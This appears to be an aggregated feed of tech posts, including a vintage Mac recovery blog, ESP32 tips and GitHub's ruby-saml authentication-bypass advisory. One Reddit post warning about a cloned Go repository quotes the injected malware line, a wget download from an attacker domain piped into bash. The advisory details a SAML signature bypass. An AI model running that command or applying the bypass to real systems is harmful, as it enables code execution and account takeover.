MSC initiator mode, which allows it to act as a USB-to-SCSI bridge. Sorry about the flickery screen; I couldn’t get my phone camera’s shutter speed to sync up perfectly with the display’s refresh rate.Sure enough, when I opened the game from the CD, the computer did exactly what Apple’s tech note said it would do. The workaround of copying the application to my hard drive worked just fine. If it’s not obvious, I sped up the process of copying it to the hard drive — it took a while! It might be interesting someday to look into why this game accidentally activated the OS recovery, but this blog is already getting way too long!I want to talk a little more about the yellow screen of shame. When I first saw it, I wasn’t entirely sure if it was really part of the recovery functionality or if the original owner just had terrible taste.Digging deeper, I found three clues that all made it clear it was an intentional choice by Apple to really make it obvious that something was wrong. First, the yellow pattern is stored as a ‘ppat’ resource in the recovery app.Second, the System file in the recovery partition has the default blue-gray Performa background shown in the screenshots above. This makes sense, because it’s the pattern that showed up with the dialog about the Performa having trouble starting up.And lastly, page 3 of the Read Me app implies that something may have changed your desktop pattern.So clearly, the recovery process, by design, sets up the custom yellow background.Why did I care so much about finding this lost partition? Well, there are a number of reasons. For one, this is exactly the kind of research project that’s perfect for me because I don’t know how to let things go. It’s also something that, quite frankly, needed to be preserved before it became extinct. The most important reason, though, is that this functionality is historically significant and deserves some attention. How many personal computers in 1994 still had the ability to boot after the OS was trashed? Isn’t this an extremely early example of this type of functionality? Did Windows have anything like this prior to Vista? Did the Mac have anything else like this prior to sometime in the OS X era? I would love to hear more comments about what you think on this. I admittedly don’t know a ton about older machines that weren’t Macs.I’m not saying this feature is perfect. Since we’ve already seen that the Dinosaur Safari CD was able to accidentally activate it, I wouldn’t be surprised if there were other ways to inadvertently cause it to pop up too. It also required manual intervention after the recovery process, which meant that you needed a fair amount of computer knowledge to finish fixing your OS. The average Joe Schmoe would probably have trouble following these directions to fix the System Folder. But still, it leaves you with a bootable system instead of an unusable computer with a flashing question mark. It’s very cool, especially for 1994.I wonder why Apple didn’t continue down this path with subsequent models? Or even retroactively adding the functionality to earlier ones after a fresh install of a newer OS. I’m not aware of any other Macs that have this partition. It doesn’t depend on any special ROM support or anything like that, at least as far as I can see. I tried out the recovery functionality on several other machines: a IIci, LC, LC 475, and an emulated Performa 600, and it works great on all of them. Heck, it even works on the Classic II/Performa 200!It kind of looks like the window size of the Read Me app was a calculated decision to ensure it would fit on the 512×342 screen used in black-and-white compact Macs.Thinking about later models, the Performa 630 series used an internal IDE hard drive instead of SCSI, so the custom version of Apple HD SC Setup was no longer used. I wonder if the Performa 57x series had this partition? You’d think they would have had the exact same software bundle as the tray-loading 550 models. If any readers have a Performa 57x machine, I’d greatly appreciate it if you could check!How did this functionality actually work under the hood? I haven’t gone too deep into the code (maybe it can be a future post), but I have pieced together a few clues. The “msjy” magic number I talked about earlier definitely plays a part in everything. The special Performa version of Apple HD SC Setup also includes a custom version of Apple’s hard disk driver. This driver contains several references to msjy, so I’m pretty sure that’s what it uses to identify the recovery partition.I also discovered that the 7.1P4 and 7.1P5 Utilities floppy disks, which were bundled with various Performas, have slightly older custom versions of Apple HD SC Setup: 7.2.1P and 7.2.2P respectively. They also create the recovery partition. The interesting thing about these versions is that it appears Apple accidentally forgot to strip out the debug function names, in both the utility itself and the bundled hard disk driver. They didn’t make this mistake in the original non-Performa 7.2.2 version, and they also didn’t make the mistake in the newer 7.2.2P6 version. Anyway, this is kind of cool, because it tells me the names of functions that look for “msjy” at an offset of 0x9C. Function names in that same area of the driver code include: , , , , and . So Apple definitely at least sort of released some of the recovery functionality to the public prior to 7.1P6, despite what their own version history says. And the disk driver is definitely involved in it.Newer versions of Apple’s disk driver no longer contain the magic number, so at some point they must have abandoned this functionality. In my opinion, it’s a real shame that they ditched it — this could have been very useful going forward on all Macs. They could have even expanded on it and automated more of the recovery process. Sure, it used some of your hard drive space, but it could have been a good trade-off for better reliability.That’s more than enough technical stuff for one post. I am sharing a download link where you can try this functionality out for yourself if you want. After all, the whole reason I did this was for software preservation purposes, so it makes sense to share it with the world. This is a small piece of Apple software history that, to my knowledge, has not been preserved until now. I uploaded a drive image to the Macintosh Garden. Don’t worry, I didn’t include any of the original owner’s personal data. I started fresh with a blank hard drive image, restored it using the 7.1P6 Performa CD, and then only copied over the restore partition from the dumped hard drive. So this is a factory-fresh Performa 550 7.1P6 install with the recovery partition also present and populated.The MAME command that I use to boot from this disk image is:Of course, you can also test it out on a real machine by copying the hard drive image to a ZuluSCSI or BlueSCSI and naming it something like HD00.hda.Winding down this super long post now, the main lessons I learned from this research project are:If you get your hands on a vintage computer, strongly consider backing the hard drive up before erasing it. I know it might contain someone’s personal files, so be mindful of that, and of course respect their privacy. But there might still be something hiding in the background that has been lost to time. You never know — it happened here!The fact that many hard drives go bad as they age might actually be a good thing for software preservation. If a vintage computer’s hard drive has a stuck head that can easily be bypassed, someone might sell it as non-working with data intact, rather than erasing it and selling it as “fully tested and wiped”.There are some really awesome people out there in the world!Special thanks to Pierre for discovering that this functionality even existed in the first place, and getting the word out so we could eventually preserve it. I also have to thank David Pogue and Joseph Schorr for writing about it in their book many decades ago. And of course, huge thanks to the amazing person from Reddit, who asked not to be credited, who gave me the opportunity to borrow and repair the drive that ended up containing the lost partition. You’re seriously the best!I’m going to repeat this again in case anybody has scrolled all the way to the end. There are still missing pieces of knowledge about how exactly this recovery partition would have been originally created. If you happen to have a Performa 550 with its original hard drive and wouldn’t mind checking for the partition and/or a special version of Apple Backup, please let me know! I would be happy to walk anybody through the process of dumping the drive contents. I’ll send you something if you don’t have the equipment needed to dump a hard drive. Even if the machine has been upgraded to System 7.5 or Mac OS 7.6, it’s still fine — everything could very well still be there, lurking in the background.]]></content:encoded></item><item><title>ESP32 WiFi Superstitions</title><link>https://supakeen.com/weblog/esp32-wifi-superstitions/</link><author>supakeen</author><category>dev</category><category>hn</category><pubDate>Sat, 15 Mar 2025 23:12:08 +0000</pubDate><source url="https://news.ycombinator.com/">HN Front</source><content:encoded><![CDATA[The ESP32 is a popular microcontroller to use for do-it-yourself home automation, sensors, and a variety of other bits and bobs that you might want to take care of around the house. It’s the successor to the venerable ESP8266 which has found its way into many of our WiFi connected devices (seriously, open up a device and chances are relatively large that you’ll find one).After having done quite a few projects based on the ESP32 in the Arduino and esp-idf frameworks I did start to notice some pecularities with my deployed devices (fancy wording for the one in my electrical cabinet that’s  to send the electrical usage data somewhere and a hodgepodge of sensor boards around the house, mostly the Snuffelaar by Sebastius with firmware written by Juerd).It seemed some of my ESP32 based boards were regularly losing connectivity. Initially my thoughts went out to the terrible power supplies I was using to run them (the cheapest of the cheap USB power supplies that came with a variety of accessories around my house). After switching these out for some more accessible and probably better quality tested Ikea chargers the problems, however, persisted.Asking around for experience from others at RevSpace, my local hackerspace, seemed to indicate that people had seen similar things with their ESP32-based projects. But not everyone had these issues. Slowly I started gathering more and more “superstitions” around how to keep these microcontrollers connected to my internet. Here are my favorite ones, I have applied all of these and while I haven’t tested them one-by-one the combination of them has ensured steady connections on my SSIDs.While these workarounds don’t quite come close to placing a hexagon of CR2023 batteries around your ESP32 while you chant the 802.11ax specification at it, they have no basis in any  research I did. Take these as anecdotal workarounds for ESP32’s losing connectivity to your WiFi.Turn off power saving on the ESP32The ESP8266 never had any power saving for its WiFi modem stack, however the ESP32 . To me this is the most likely culprit in that in some network configurations, perhaps in combination with some radios, the power saving does something that makes it stop interacting with the network.In your personal handcrafted firmware you can use the following, which should work in esp-idf  Arduino (from what I’ve been told):For ESPHome based projects you can add:Set your APs to use 20 Mhz wide channelsIf you have fancy network hardware then you can likely configure the channel width for the network that serves your ESP32’s. From what people and the internet tell me you  set the band width on the 2.4 Ghz network that your boards use to , not 40, not 60, and definitely not automatic.Pin your ESP32’s to a single APIt seems that when an ESP32 connects it goes straight for the first access point it sees. No matter if that access point is not the one you’ve taped it to. This can lead to bad connectivity, especially since I’ve not really observed ESP32’s moving around to other access points. If your network hardware allows it, you should pin the device to the closest one.These urban legends have so far made it seem that at least my problems are ghosts of the past. I haven’t had a device drop from the network in about a week or two now while they used to drop multiple times per day. I’m planning to drop my application level keep-alives (still a good idea, I’ll write about them another time) because they seem to not be necessary at all anymore.I hope these are of help to anyone, and that the spirits of the ESP32 deem your network worthy too.]]></content:encoded></item><item><title>Deploying Local Kubernetes Cluster with Terraform &amp; KVM</title><link>https://www.reddit.com/r/kubernetes/comments/1jc7np0/deploying_local_kubernetes_cluster_with_terraform/</link><author>/u/rached2023</author><category>dev</category><category>reddit</category><category>k8s</category><pubDate>Sat, 15 Mar 2025 23:06:58 +0000</pubDate><source url="https://www.reddit.com/r/kubernetes/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Kubernetes</source><content:encoded><![CDATA[I'm trying to deploy a local Kubernetes cluster (1 master & 2 workers) using Terraform on KVM-based virtual machines. However, when I run , I keep encountering the following error: │ interrupted - last error: SSH authentication failed : ssh: handshake failed: ssh: unable to authenticate, attempted methods [none publickey], no supported │ methods remainand this is my code for ssh : variable "ssh_private_key" { default = "/home/rached/.ssh/id_rsa" type = string } connection { type = "ssh" user = var.ssh_user password = var.ssh_password # The password for SSH authentication private_key = file(var.ssh_private_key) host = each.key == "master1" ? "192.168.122.6" : (each.key == "worker1" ? "192.168.122.197" : "192.168.122.184") timeout = "5m" I have already: ✅ Checked SSH key permissions ✅ Verified that the public key is added to the VM ✅ Confirmed that SSH is enabled on the VMHas anyone faced a similar issue? Any insights or troubleshooting steps would be greatly appreciated!]]></content:encoded></item><item><title>Linux in Furniture Store</title><link>https://www.reddit.com/r/linux/comments/1jc76ce/linux_in_furniture_store/</link><author>/u/S4ndwichGurk3</author><category>dev</category><category>reddit</category><pubDate>Sat, 15 Mar 2025 22:43:47 +0000</pubDate><source url="https://www.reddit.com/r/linux/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Linux</source><content:encoded><![CDATA[I was amazed today and have to share this.I was in a large furniture store today in Germany and asked an employee about my online order. She went to the PC and I noticed that it runs Linux. It looked like an older version of KDE. Okay, Linux might be getting more popular for such use-cases, if I had a company like this I would also use Linux, so maybe not that special.But what really amazed me was their software. It is as simple as it gets: a TUI with green text and black background, no mouse input, all done by keyboard, navigating around, entering in some numbers, and within seconds she printed something for me.It reminded me of an opposite example at my health insurance provider, where she had to click and move the mouse for 5 minutes until she printed what I needed.]]></content:encoded></item><item><title>PSA: 🌇 async-std has been officially discontinued; use smol instead</title><link>https://crates.io/crates/async-std</link><author>/u/JoshTriplett</author><category>dev</category><category>reddit</category><category>rust</category><pubDate>Sat, 15 Mar 2025 22:09:14 +0000</pubDate><source url="https://www.reddit.com/r/rust/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Rust</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>best way to integrate argocd and hashicorp vault</title><link>https://www.reddit.com/r/kubernetes/comments/1jc4ise/best_way_to_integrate_argocd_and_hashicorp_vault/</link><author>/u/Existing-Mirror2315</author><category>dev</category><category>reddit</category><category>k8s</category><pubDate>Sat, 15 Mar 2025 20:35:50 +0000</pubDate><source url="https://www.reddit.com/r/kubernetes/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Kubernetes</source><content:encoded><![CDATA[   submitted by    /u/Existing-Mirror2315 ]]></content:encoded></item><item><title>TracePerf: TypeScript-Powered Node.js Logger That Actually Shows You What&apos;s Happening</title><link>https://github.com/thelastbackspace/traceperf</link><author>/u/shubhwadekar</author><category>dev</category><category>reddit</category><pubDate>Sat, 15 Mar 2025 20:33:48 +0000</pubDate><source url="https://www.reddit.com/r/programming/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Programming</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>I implemented my own regex engine in Go</title><link>https://github.com/bogdan-deac/regex</link><author>/u/Constant_Apple_577</author><category>dev</category><category>reddit</category><category>go</category><pubDate>Sat, 15 Mar 2025 20:18:30 +0000</pubDate><source url="https://www.reddit.com/r/golang/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Go</source><content:encoded><![CDATA[Automata theory and formal languages always seemed cool to me, so I decided to implement my own regexes. It's just a toy project but I had a lot of fun doing it so far and I'll see how far I can take it.]]></content:encoded></item><item><title>A Simple Linux Desktop for People with Cognitive Decline – Where to Start?</title><link>https://www.reddit.com/r/linux/comments/1jc3mfs/a_simple_linux_desktop_for_people_with_cognitive/</link><author>/u/Important-Ad2632</author><category>dev</category><category>reddit</category><pubDate>Sat, 15 Mar 2025 19:55:45 +0000</pubDate><source url="https://www.reddit.com/r/linux/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Linux</source><content:encoded><![CDATA[I have this idea that might be a bit far-fetched, and even though I’ve used Linux for years, I’m not really sure where to start.The Background My dad was diagnosed with dementia over a year ago. While he’s still able to think clearly in many ways, his ability to use technology has taken a hit. He only got into computers and smartphones later in life, and now, with so much of society relying on digital tools—whether it’s banking, doctor appointments, or even just staying in touch—he’s struggling.Where I live, we even have a government-issued two-factor authentication device/app that’s required for almost everything. It’s frustrating for him, and I’ve seen firsthand how technology, which should be making life easier, is actually making him feel more isolated. And let’s be real—this reliance on tech is only going to increase.The Idea I’d love to create an ultra-simple Linux desktop tailored for people like my dad. Something that: • Boots straight into a locked-down, minimal desktop. • Has only a few essential programs, like a web browser, email client, or video calling app. • Allows relatives to configure everything through an admin panel setting bookmarks, fixing icons, and keeping things simple. • Runs on familiar hardware, since Linux makes it easy to install on existing devices with a USB.This would be a passion project. I just see a real need for it, and I’m sure it could help a lot of people.My Question I’m not planning on touching kernel code or diving into low-level OS development. I have some programming experience (mostly in data engineering and data science), but I don’t even know where to start researching a project like this. What tools or frameworks should I look into? Are there existing Linux distros or desktop environments that could be adapted for this purpose?I know this won’t be ready in time to help my dad, but I’d still love to explore the idea. Any pointers would be appreciated!Even if I drop the project along the way I still get to learn something new about Linux ]]></content:encoded></item><item><title>Sign in as anyone: Bypassing SAML SSO authentication with parser differentials</title><link>https://github.blog/security/sign-in-as-anyone-bypassing-saml-sso-authentication-with-parser-differentials/</link><author>campuscodi</author><category>dev</category><category>hn</category><pubDate>Sat, 15 Mar 2025 19:06:01 +0000</pubDate><source url="https://news.ycombinator.com/">HN Front</source><content:encoded><![CDATA[Critical authentication bypass vulnerabilities (CVE-2025-25291 + CVE-2025-25292) were discovered in ruby-saml up to version 1.17.0. Attackers who are in possession of a single valid signature that was created with the key used to validate SAML responses or assertions of the targeted organization can use it to construct SAML assertions themselves and are in turn able to log in as any user. In other words, it could be used for an account takeover attack. Users of ruby-saml should update to version 1.18.0. References to libraries making use of ruby-saml (such as omniauth-saml) need also be updated to a version that reference a fixed version of ruby-saml.In this blog post, we detail newly discovered authentication bypass vulnerabilities in the ruby-saml library used for single sign-on (SSO) via SAML on the service provider (application) side. GitHub doesn’t currently use ruby-saml for authentication, but began evaluating the use of the library with the intention of using an open source library for SAML authentication once more. This library is, however, used in other popular projects and products. We discovered an exploitable instance of this vulnerability in GitLab, and have notified their security team so they can take necessary actions to protect their users against potential attacks.GitHub previously used the ruby-saml library up to 2014, but moved to our own SAML implementation due to missing features in ruby-saml at that time. Following bug bounty reports around vulnerabilities in our own implementation (such as CVE-2024-9487, related to encrypted assertions), GitHub recently decided to explore the use of ruby-saml again. Then in October 2024, a blockbuster vulnerability dropped: an authentication bypass in ruby-saml (CVE-2024-45409) by ahacker1. With tangible evidence of exploitable attack surface, GitHub’s switch to ruby-saml had to be evaluated more thoroughly now. As such, GitHub started a private bug bounty engagement to evaluate the security of the ruby-saml library. We gave selected bug bounty researchers access to GitHub test environments using ruby-saml for SAML authentication. In tandem, the GitHub Security Lab also reviewed the attack surface of the ruby-saml library.As is not uncommon when multiple researchers are looking at the same code, both ahacker1, a participant in the GitHub bug bounty program, and I noticed the same thing during code review: ruby-saml was using two different XML parsers during the code path of signature verification. Namely, REXML and Nokogiri. While REXML is an XML parser implemented in pure Ruby, Nokogiri provides an easy-to-use wrapper API around different libraries like libxml2, libgumbo and Xerces (used for JRuby). Nokogiri supports parsing of XML and HTML. It looks like Nokogiri was added to ruby-saml to support canonicalization and potentially other things REXML didn’t support at that time.We both inspected the same code path in the  of  and found that the signature element to be verified is first read via REXML, and then also with Nokogiri’s XML parser. So, if REXML and Nokogiri could be tricked into retrieving different signature elements for the same XPath query it might be possible to trick ruby-saml into verifying the wrong signature. It looked like there could be a potential authentication bypass due to a !The reality was actually more complicated than this.Roughly speaking, four stages were involved in the discovery of this authentication bypass:Discovering that two different XML parsers are used during code review.  Establishing if and how a parser differential could be exploited.  Finding an actual parser differential for the parsers in use.  Leveraging the parser differential to create a full-blown exploit.To prove the security impact of this vulnerability, it was necessary to complete all four stages and create a full-blown authentication bypass exploit.Quick recap: how SAML responses are validatedSecurity assertion markup language (SAML) responses are used to transport information about a signed-in user from the identity provider (IdP) to the service provider (SP) in XML format. Often the only important information transported is a username or an email address. When the HTTP POST binding is used, the SAML response travels from the IdP to the SP via the browser of the end user. This makes it obvious why there has to be some sort of signature verification in play to prevent the user from tampering with the message.Let’s have a quick look at what a simplified SAML response looks like:Note: in the response above the XML namespaces were removed for better readability.As you might have noticed: the main part of a simple SAML response is its assertion element (A), whereas the main information contained in the assertion is the information contained in the  element (B) (here the NameID containing the username: admin). A real assertion typically contains more information (e.g.  and  dates as part of a  element.)Normally, the  (A) (without the whole  part) is canonicalized and then compared against the  (C) and the  (D) is canonicalized and verified against the  (E). In this sample, the assertion of the SAML response is signed, and in other cases the whole SAML response is signed.Searching for parser differentialsWe learned that ruby-saml used two different XML parsers (REXML and Nokogiri) for validating the SAML response. Now let’s have a look at the verification of the signature and the digest comparison.
The focus of the following explanation lies on the  method inside of .Inside that method, there’s a broad XPath query with REXML for the first signature element inside the SAML document:sig_element = REXML::XPath.first(
  @working_copy,
  "//ds:Signature",
  {"ds"=>DSIG}
)
Hint: When reading the code snippets, you can tell the difference between queries for REXML and Nokogiri by looking at how they are called. REXML methods are prefixed with , whereas Nokogiri methods are called on .Later, the actual  is read from this element:base64_signature = REXML::XPath.first(
  sig_element,
  "./ds:SignatureValue",
  {"ds" => DSIG}
)
signature = Base64.decode64(OneLogin::RubySaml::Utils.element_text(base64_signature))
Note: the name of the  element might be a bit confusing. While it contains the actual signature in the  node it also contains the part that is actually signed in the  node. Most importantly the  element contains the digest (hash) of the assertion and information about the used key.So, an actual  element could look like this (removed namespace information for better readability):<Signature>
    <SignedInfo>
        <CanonicalizationMethod Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#" />
        <SignatureMethod Algorithm="http://www.w3.org/2001/04/xmldsig-more#rsa-sha256" />
        <Reference URI="#_SAMEID">
            <Transforms><Transform Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#" /></Transforms>
            <DigestMethod Algorithm="http://www.w3.org/2001/04/xmlenc#sha256" />
            <DigestValue>Su4v[..]</DigestValue>
        </Reference>
    </SignedInfo>
    <SignatureValue>L8/i[..]</SignatureValue>
    <KeyInfo>
        <X509Data>
            <X509Certificate>MIID[..]</X509Certificate>
        </X509Data>
    </KeyInfo>
</Signature>
Later in the same method () there’s again a query for the Signature(s)—but this time with Nokogiri.noko_sig_element = document.at_xpath('//ds:Signature', 'ds' => DSIG)
Then the  element is taken from that signature and canonicalized:noko_signed_info_element = noko_sig_element.at_xpath('./ds:SignedInfo', 'ds' => DSIG)

canon_string = noko_signed_info_element.canonicalize(canon_algorithm)
Let’s remember this  contains the canonicalized  element.The  element is then also extracted with REXML: signed_info_element = REXML::XPath.first(
        sig_element,
        "./ds:SignedInfo",
        { "ds" => DSIG }
 )
From this  element the  node is read:ref = REXML::XPath.first(signed_info_element, "./ds:Reference", {"ds"=>DSIG})
reference_nodes = document.xpath("//*[@ID=$id]", nil, { 'id' => extract_signed_element_id })
The method extract_signed_element_idextracts the signed element id with help of REXML. From the previous authentication bypass (CVE-2024-45409), there’s now a check that only one element with the same ID can exist.The first of the  is taken and canonicalized:hashed_element = reference_nodes[0][..]canon_hashed_element = hashed_element.canonicalize(canon_algorithm, inclusive_namespaces)
The  is then hashed:hash = digest_algorithm.digest(canon_hashed_element)
The  to compare it against is then extracted with REXML:encoded_digest_value = REXML::XPath.first(
        ref,
        "./ds:DigestValue",
        { "ds" => DSIG }
      )
digest_value = Base64.decode64(OneLogin::RubySaml::Utils.element_text(encoded_digest_value))
Finally, the  (built from the element extracted by Nokogiri) is compared against the  (extracted with REXML):unless digests_match?(hash, digest_value)
The  extracted some lines ago (a result of an extraction with Nokogiri) is later verified against (extracted with REXML).unless cert.public_key.verify(signature_algorithm.new, signature, canon_string)
In the end, we have the following constellation:The assertion is extracted and canonicalized with Nokogiri, and then hashed. In contrast, the hash against which it will be compared is extracted with REXML.  The SignedInfo element is extracted and canonicalized with Nokogiri - it is then verified against the SignatureValue, which was extracted with REXML.Exploiting the parser differentialThe question is: is it possible to create an XML document where REXML sees one signature and Nokogiri sees another?Ahacker1, participating in the bug bounty, was faster to produce a working exploit using a parser differential. Among other things, ahacker1 was inspired by the XML roundtrips vulnerabilities published by Mattermost’s Juho Forsén in 2021.Not much later, I produced an exploit using a different parser differential with the help of Trail of Bits’ Ruby fuzzer called ruzzy.Both exploits result in an authentication bypass. Meaning that an attacker, who is in possession of a single valid signature that was created with the key used to validate SAML responses or assertions of the targeted organization, can use it to construct assertions for any users which will be accepted by ruby-saml. Such a signature can either come from a signed assertion or response from another (unprivileged) user or in certain cases, it can even come from signed metadata of a SAML identity provider (which can be publicly accessible).An exploit could look like this. Here, an additional Signature was added as part of the  element that is only visible to Nokogiri:The  element (A) from the signature that is visible to Nokogiri is canonicalized and verified against the  (B) that was extracted from the signature seen by REXML.The assertion is retrieved via Nokogiri by looking for its ID. This assertion is then canonicalized and hashed (C). The hash is then compared to the hash contained in the  (D). This DigestValue was retrieved via REXML. This DigestValue has no corresponding signature.So, two things take place:A valid SignedInfo with DigestValue is verified against a valid signature. (which checks out)  A fabricated canonicalized assertion is compared against its calculated digest. (which checks out as well)This allows an attacker, who is in possession of a valid signed assertion for any (unprivileged) user, to fabricate assertions and as such impersonate any other user.Check for errors when using NokogiriParts of the currently known, undisclosed exploits can be stopped by checking for Nokogiri parsing errors on SAML responses. Sadly, those errors do not result in exceptions, but need to be checked on the  member of the parsed document:doc = Nokogiri::XML(xml) do |config|
  config.options = Nokogiri::XML::ParseOptions::STRICT | Nokogiri::XML::ParseOptions::NONET
end

raise "XML errors when parsing: " + doc.errors.to_s if doc.errors.any?
While this is far from a perfect fix for the issues at hand, it renders at least one exploit infeasible.We are not aware of any reliable indicators of compromise. While we’ve found a potential indicator of compromise, it only works in debug-like environments and to publish it, we would have to reveal too many details about how to implement a working exploit so we’ve decided that it’s better not to publish it. Instead, our best recommendation is to look for suspicious logins via SAML on the service provider side from IP addresses that do not align with the user’s expected location.SAML and XML signatures:as confusing as it getsSome might say it’s hard to integrate systems with SAML. That might be true. However, it’s even harder to write implementations of SAML using XML signatures in a secure way. As others have stated before: it’s probably best to disregard the specifications, as following them doesn’t help build secure implementations.
To rehash how the validation works if the SAML assertion is signed, let’s have a look at the graphic below,  depicting a simplified SAML response. The assertion, which transports the protected information, contains a signature. Confusing, right?To complicate it even more: What is even signed here? The whole assertion? No!What’s signed is the  element and the  element contains a . This  is the hash of the canonicalized assertion with the signature element removed before the canonicalization. This two-stage verification process can lead to implementations that have a disconnect between the verification of the hash and the verification of the signature. This is the case for these Ruby-SAML parser differentials: while the hash and the signature check out on their own, they have no connection. The hash is actually a hash of the assertion, but the signature is a signature of a different  element containing another hash. What you actually want is a direct connection between the hashed content, the hash, and the signature. (And once the verification is done you only want to retrieve information from the exact part that was actually verified.) Or, alternatively, use a less complicated standard to transport a cryptographically signed username between two systems - but here we are.In this case, the library already extracted the  and used it to verify the signature of its canonicalized string,. However, it did not use it to obtain the digest value. If the library had used the content of the already extracted  to obtain the digest value, it would have been secure in this case even with two XML parsers in use.As shown once again: relying on two different parsers in a security context can be tricky and error-prone. That being said: exploitability is not automatically guaranteed in such cases. As we have seen in this case, checking for Nokogiri errors could not have prevented the parser differential, but could have stopped at least one practical exploitation of it.The initial fix for the authentication bypasses does not remove one of the XML parsers to prevent API compatibility problems. As noted, the more fundamental issue was the disconnect between verification of the hash and verification of the signature, which was exploitable via parser differentials. The removal of one of the XML parsers was already planned for other reasons, and will likely come as part of a major release in combination with additional improvements to strengthen the library. If your company relies on open source software for business-critical functionality, consider sponsoring them to help fund their future development and bug fix releases.If you’re a user of ruby-saml library, make sure to update to the latest version, 1.18.0, containing fixes for CVE-2025-25291 and CVE-2025-25292. References to libraries making use of ruby-saml (such as omniauth-saml) need also be updated to a version that reference a fixed version of ruby-saml. We will publish a proof of concept exploit at a later date in the GitHub Security Lab repository.Special thanks to Sixto Martín, maintainer of ruby-saml, and Jeff Guerra from the GitHub Bug Bounty program.
Special thanks also to ahacker1 for giving inputs to this blog post.2024-11-04: Bug bounty report demonstrating an authentication bypass was reported against a GitHub test environment evaluating ruby-saml for SAML authentication.  2024-11-04: Work started to identify and test potential mitigations.  2024-11-12: A second authentication bypass was found by Peter that renders the planned mitigations for the first useless.  2024-11-13: Initial contact with Sixto Martín, maintainer of ruby-saml.  2024-11-14: Both parser differentials are reported to ruby-saml, the maintainer responds immediately.  2024-11-14: The work on potential patches by the maintainer and ahacker1 begins. (One of the initial ideas was to remove one of the XML parsers, but this was not feasible without breaking backwards compatibility).  2025-02-04: ahacker1 proposes a non-backwards compatible fix.  2025-02-06: ahacker1 also proposes a backwards compatible fix.  2025-02-12: The 90 days deadline of GitHub Security Lab advisories ends.  2025-02-16: The maintainer starts working on a fix with the idea to be backwards-compatible and easier to understand.  2025-02-17: Initial contact with GitLab to coordinate a release of their on-prem product with the release of the ruby-saml library.  2025-03-12: A fixed version of ruby-saml was released.Security Researcher at GitHub Security Lab]]></content:encoded></item><item><title>My 6 months with the GoTH stack: building front-ends with Go, HTML and a little duct tape</title><link>https://open.substack.com/pub/thefridaydeploy/p/my-6-months-with-the-goth-stack-building?r=36rml&amp;amp;utm_campaign=post&amp;amp;utm_medium=web&amp;amp;showWelcomeOnShare=true</link><author>/u/theothertomelliott</author><category>dev</category><category>reddit</category><category>go</category><pubDate>Sat, 15 Mar 2025 17:58:10 +0000</pubDate><source url="https://www.reddit.com/r/golang/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Go</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Someone copied our GitHub project, made it look more trustworthy by adding stars from many fake users, and then injected malicious code at runtime for potential users.</title><link>https://www.reddit.com/r/golang/comments/1jbzuot/someone_copied_our_github_project_made_it_look/</link><author>/u/_a8m_</author><category>dev</category><category>reddit</category><category>go</category><pubDate>Sat, 15 Mar 2025 17:08:31 +0000</pubDate><source url="https://www.reddit.com/r/golang/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Go</source><content:encoded><![CDATA[Something crazy I found today before it went viral is that someone copied our GitHub project, faked stars for credibility from accounts created just a few weeks ago, and then injected malicious code at runtime for potential users.wget -O - https://requestbone.fun/storage/de373d0df/a31546bf | /bin/bash & I went over some of the stargazers, and it looks like it was done for other projects too. I expect the impact is much bigger that just our project. It's hard to detect the full impact. The attacker obfuscates the code, changing identifiers and scrambling the byte array order, so you can't easily search for it on GitHub. This makes it nearly impossible to track the full impact unless GitHub steps up and helps resolve this issue (I reported these repos to GitHub support).]]></content:encoded></item><item><title>How many artists&apos; careers did the Beatles kill?</title><link>https://www.cantgetmuchhigher.com/p/how-many-artists-did-the-beatles</link><author>dwighttk</author><category>dev</category><category>hn</category><pubDate>Sat, 15 Mar 2025 17:05:07 +0000</pubDate><source url="https://news.ycombinator.com/">HN Front</source><content:encoded><![CDATA[When you ask people about the most consequential years in popular music, there might be no year that comes up more often than 1964. Of course, the most important thing about that year is The Beatles landing in the United States and kicking off the British Invasion. But the year is endlessly discussed because so much else went on. The Rolling Stones released their debut albumMotown became a dominant force in pop music, releasing four number ones, three of which were by The SupremesBob Dylan dropped two albumsThe Beach Boys continued their run of hits“Everybody Loves Somebody” by Dean Martin“Where Did Our Love Go” by The Supremes“A Hard Day’s Night” by The Beatles“Rag Doll” by Frankie Valli & the Four Seasons“Under the Boardwalk” by The DriftersThese are five songs that I return to often. And weeks like this weren’t even that rare in 1964. Just one week later, you had the same songs in the top five, except “Rag Doll” was replaced by The Animals’ “House of the Rising Son,” the song that some claim made Dylan go electric and pushed rock music into a completely new direction.The one claim that’s always fascinated me about 1964 is that it was a line of demarcation between an old and a new way to make music. If you were making hits in 1963 and didn’t change your sound in 1964, you were going to be waiting tables by the beginning of 1965. In other words, The Beatles-led British Invasion decimated the careers of scores of artists. But was this really the case?To do this, I grabbed a list of all 175 acts who released at least one top 40 single in 1963. (Fun fact: the record for the most top 40 hits that year was shared by five acts: Bobby Vinton, Brenda Lee, Dion & the Belmonts, Ray Charles, and The Beach Boys. Each had six top 40 hits.) I then decided to see which of those acts never released a hit in 1964 or any year after. In total, 88 of those 175 acts, or 50%, never had a top 40 hit again. That’s kind of a lot. In other words, The Beatles and their fellow invading Brits killed a lot of careers. Or did they? By looking at only a single year we could be biased. And we are.If we calculate that same rate for every single year between 1960 and 2020, we see that while the kill rate in 1964 was high, it wasn’t completely out of the ordinary. The median is around 40%. Having a multi-year career as a popular artist is just hard. By looking at the years with the highest rates, we can glean a few other things, though.First, three of the top ten rates are 1962, 1963, and 1964. In other words, there is some credence to the theory that the British Invasion decimated many careers. Nevertheless, the fact that the rates in 1962 and 1963 are high tells me that sonic changes were brewing in the United States too. Had The Beatles not arrived, rock music probably still would have evolved in a way that would have left earlier hitmakers in the dust. That sonic evolution would have been different, though.changed their chart methodologyearlier newsletterIn other words, the 1990s were strange. And I think we are just beginning to grapple with that strangeness. Because of that, there was a ton of turnover on the charts. It’s hard for artists to keep up with trends when grunge, gangsta rap, swing, and a new breed of teen pop are all successful in a matter of years. Being a superstar isn’t easy.Aggregating this data got me thinking about which artists have been able to survive the 